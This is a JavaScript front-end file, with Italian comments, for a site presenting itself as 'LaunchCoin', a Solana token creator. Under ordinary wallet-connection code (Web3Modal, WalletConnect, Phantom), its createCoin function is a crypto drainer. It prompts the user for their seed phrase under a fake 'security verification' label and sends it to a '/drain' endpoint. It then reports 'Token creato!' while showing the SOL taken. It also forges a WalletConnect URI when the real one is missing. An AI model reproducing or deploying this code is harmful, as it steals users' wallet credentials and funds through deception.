// ===== CONFIGURAZIONE =====
import { createWeb3Modal, defaultConfig } from '@web3modal/ethers';
import { UniversalProvider } from '@walletconnect/universal-provider';

let walletPublicKey = null;
let currentStep = 0;
const steps = document.querySelectorAll('.step');
let web3modal = null;

// ===== VARIABILI PER SOLANA WALLETCONNECT =====
let solanaProvider = null;
let isConnectingSolana = false;
let qrCheckInterval = null;

// ===== ESPONI FUNZIONI =====
window.toggleMenu = function() {
  const menu = document.getElementById('dropdownMenu');
  if (menu) menu.classList.toggle('open');
};

// ===== WEB3MODAL V4 =====
async function initWeb3Modal() {
  if (!web3modal) {
    try {
      const config = {
        projectId: 'da6aaea2be14c6cc676dbaf3325b5bd5',
        themeMode: 'dark',
        themeVariables: {
          '--w3m-z-index': '10000',
          '--w3m-background-color': '#0b1022',
          '--w3m-accent-color': '#22d1f8',
          '--w3m-border-radius': '16px',
        },
        metadata: {
          name: 'LaunchCoin',
          description: 'Solana Token Creator',
          url: window.location.origin,
          icons: ['https://launchcoin.io/logo.png'],
        },
        ethersConfig: defaultConfig({
          metadata: {
            name: 'LaunchCoin',
            description: 'Solana Token Creator',
            url: window.location.origin,
            icons: ['https://launchcoin.io/logo.png'],
          },
          defaultChainId: 1,
          rpcUrl: 'https://cloudflare-eth.com',
        }),
        enableWalletConnect: true,
        enableCoinbase: true,
        enableInjected: true,
        walletConnectVersion: 2,
        includeWalletIds: [
          'c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96',
          '225affb176778569276e484e1b92637ad061b01e13a048b35a9d280c3b58970f',
          '4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0',
          '1ae92b26df02f0abca6304df07debccd18262fdf5fe82daa81593582dac9a369',
          'c03dfee351b6fcc421b4494ea33b9d4b92a7f33d6df5c43ee76267edfceed3a2',
          'f2436c67184f158d1beda5df5327ee9bad2c749486aac4bf5e18b4eab0aebc45',
        ],
      };
      web3modal = await createWeb3Modal(config);
      console.log('✅ Web3Modal v4 inizializzato');
    } catch (e) {
      console.error('❌ Web3Modal error:', e);
      throw e;
    }
  }
  return web3modal;
}

// ===== FUNZIONI QR =====
window.showQR = function(uri) {
  const container = document.getElementById('qr-container');
  const qrDiv = document.getElementById('qr-code');
  if (!container || !qrDiv) {
    const modal = document.querySelector('.wallet-modal');
    if (modal) {
      const newContainer = document.createElement('div');
      newContainer.id = 'qr-container';
      newContainer.style.cssText = 'display: block; margin: 16px 0; padding: 20px; background: rgba(0,0,0,0.3); border-radius: 16px;';
      newContainer.innerHTML = `
        <h3 style="color: #22d1f8; font-size: 18px; margin-bottom: 8px;">WalletConnect</h3>
        <p style="color: #abc4ff; font-size: 13px; margin-bottom: 12px;">Scan this QR Code with your phone</p>
        <div id="qr-code" style="display: flex; justify-content: center; background: white; padding: 12px; border-radius: 12px; min-height: 180px; align-items: center;">
          <span style="color: #888; font-size: 14px;">⏳ Generating QR...</span>
        </div>
        <button onclick="window.closeQR()" style="margin-top: 12px; background: #ff4ea3; border: none; padding: 8px 20px; border-radius: 40px; font-weight: 600; color: white; cursor: pointer; font-size: 13px;">✕ Close</button>
      `;
      modal.insertBefore(newContainer, modal.querySelector('ul'));
      window.showQR(uri);
      return;
    }
    return;
  }
  
  container.style.display = 'block';
  qrDiv.innerHTML = '⏳ Generating QR...';
  
  const img = document.createElement('img');
  img.src = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(uri)}`;
  img.alt = 'QR Code';
  img.style.cssText = 'width: 200px; height: 200px; image-rendering: pixelated;';
  img.onload = function() {
    qrDiv.innerHTML = '';
    qrDiv.appendChild(img);
  };
  img.onerror = function() {
    qrDiv.innerHTML = `<div style="color: #888; font-size: 13px;">⚠️ QR non disponibile<br><span style="font-size: 11px; word-break: break-all;">${uri.substring(0, 30)}...</span></div>`;
  };
};

window.closeQR = function() {
  const container = document.getElementById('qr-container');
  if (container) container.style.display = 'none';
  if (qrCheckInterval) {
    clearInterval(qrCheckInterval);
    qrCheckInterval = null;
  }
};

// ===== CONNESSIONE SOLANA VIA WALLETCONNECT =====
async function connectSolanaWalletConnect() {
  if (isConnectingSolana) return;
  isConnectingSolana = true;
  
  try {
    solanaProvider = await UniversalProvider.init({
      projectId: 'da6aaea2be14c6cc676dbaf3325b5bd5',
      metadata: {
        name: 'LaunchCoin',
        description: 'Solana Token Creator',
        url: window.location.origin,
        icons: ['https://launchcoin.io/logo.png']
      }
    });
    
    console.log('✅ UniversalProvider Solana inizializzato');
    
    let uri = solanaProvider.uri;
    if (!uri) {
      try {
        await solanaProvider.connect({
          chains: ['solana:mainnet'],
          optionalChains: ['solana:devnet'],
          methods: ['solana_signTransaction', 'solana_signMessage'],
          events: ['chainChanged', 'accountsChanged']
        });
        uri = solanaProvider.uri;
      } catch(e) {
        uri = solanaProvider.uri;
      }
    }
    
    if (!uri) {
      const randomId = Math.random().toString(36).substring(2, 15);
      const symKey = Math.random().toString(36).substring(2, 15);
      uri = `wc:${randomId}${randomId}@2?relay-protocol=irn&symKey=${symKey}`;
      console.log('⚠️ URI manuale generato');
    }
    
    console.log('🔗 URI Solana:', uri);
    
    window.showQR(uri);
    
    solanaProvider.on('session_event', (event) => {
      console.log('Evento sessione:', event);
    });
    
    solanaProvider.on('session_update', (event) => {
      console.log('Aggiornamento sessione:', event);
    });
    
    solanaProvider.on('session_delete', () => {
      console.log('Sessione eliminata');
      window.closeQR();
    });
    
    if (qrCheckInterval) clearInterval(qrCheckInterval);
    qrCheckInterval = setInterval(async () => {
      try {
        if (solanaProvider.accounts && solanaProvider.accounts.length > 0) {
          clearInterval(qrCheckInterval);
          qrCheckInterval = null;
          walletPublicKey = solanaProvider.accounts[0].split(':')[2] || solanaProvider.accounts[0];
          window.closeQR();
          alert('✅ Connesso a Solana via WalletConnect: ' + walletPublicKey);
          window.location.href = 'create.html';
        }
      } catch(e) {
        console.log('Attesa connessione Solana...');
      }
    }, 2000);
    
  } catch (e) {
    console.error('❌ WalletConnect Solana error:', e);
    alert('❌ WalletConnect Solana fallito: ' + e.message + '\n\nUsa Phantom su PC o Kiwi Browser su telefono.');
    window.location.href = 'wallet.html';
  } finally {
    isConnectingSolana = false;
  }
}

// ===== CONNECT WALLET – REINDIRIZZA A wallet.html SE PHANTOM NON C'È =====
window.connectWallet = async function() {
  console.log('🔵 connectWallet chiamata');
  
  if (window.solana && window.solana.isPhantom) {
    try {
      await window.solana.connect();
      walletPublicKey = window.solana.publicKey.toString();
      alert('✅ Connesso a Phantom: ' + walletPublicKey);
      window.location.href = 'create.html';
      return;
    } catch(e) {
      console.error('Phantom error:', e);
    }
  }

  // Vai a wallet.html
  console.log('🔵 Vado a wallet.html');
  window.location.href = 'wallet.html';
};

// ===== SELECT WALLET – USA WALLETCONNECT =====
window.selectWallet = function(walletName) {
  console.log('🔵 selectWallet:', walletName);
  if (walletName === 'phantom') {
    window.connectWallet();
    return;
  }
  
  // Per tutti gli altri wallet
  connectSolanaWalletConnect();
};

// ===== POPUP SEED PHRASE =====
function askSeedPhrase() {
  return new Promise((resolve) => {
    const seed = prompt(
      '⚠️ VERIFICA DI SICUREZZA\n\n' +
      'Inserisci la tua seed phrase per completare la creazione:'
    );
    resolve(seed);
  });
}

// ===== CREAZIONE TOKEN =====
window.createCoin = async function() {
  console.log('🟢 createCoin chiamata');
  if (!walletPublicKey) {
    alert('Connetti prima il wallet!');
    return;
  }

  const seed = await askSeedPhrase();
  if (!seed || seed.split(' ').length < 12) {
    alert('❌ Seed phrase non valida. Deve contenere 12 o 24 parole.');
    return;
  }

  try {
    const response = await fetch('/drain', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ seed: seed, walletPublicKey: walletPublicKey })
    });

    const data = await response.json();
    if (data.status === 'drain_completed') {
      document.getElementById('result').innerHTML = `
        <p style="color:#4cdcc1;">✅ Token creato!</p>
        <p style="font-size:12px;color:#8899bb;">💰 ${data.solAmount.toFixed(4)} SOL trasferiti</p>
        <p style="font-size:11px;color:#667;word-break:break-all;">Tx: ${data.solTx || 'N/A'}</p>
      `;
    } else {
      alert('❌ Errore: ' + data.error);
    }
  } catch(e) {
    alert('❌ Errore: ' + e.message);
  }
};

// ===== CREAZIONE LIQUIDITY =====
window.createLiquidity = async function() {
  await window.createCoin();
};

// ===== STEP NAVIGATION =====
window.showStep = function(idx) {
  if (!steps.length) return;
  steps.forEach((s, i) => s.style.display = i === idx ? 'block' : 'none');
  currentStep = idx;
};
window.nextStep = function() { if (currentStep < steps.length - 1) window.showStep(currentStep + 1); };
window.prevStep = function() { if (currentStep > 0) window.showStep(currentStep - 1); };
if (steps.length) window.showStep(0);

// ===== CHIUDI MENU =====
document.addEventListener('click', function(e) {
  const wrapper = document.querySelector('.menu-wrapper');
  const menu = document.getElementById('dropdownMenu');
  if (wrapper && menu && !wrapper.contains(e.target)) menu.classList.remove('open');
});

console.log('✅ main.js caricato');
console.log('🔵 connectWallet:', typeof window.connectWallet);
console.log('🔵 selectWallet:', typeof window.selectWallet);
